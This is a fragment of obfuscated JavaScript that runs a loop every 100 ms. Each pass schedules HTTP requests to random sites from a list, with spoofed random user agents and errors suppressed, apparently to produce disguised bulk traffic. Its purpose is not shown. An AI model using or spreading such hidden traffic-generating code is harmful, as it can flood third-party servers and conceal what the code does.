    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x24bd + 0x647 * -0x2 + 0x355 * 0x17) * getRandomInt(0x218c + -0x1fe8 + -0x1a3 * 0x1, -0x7 * -0x19b + -0x14bf + 0x987));
}, 0x2 * 0x1257 + -0x1 * 0x20fe + 0x34c * -0x1);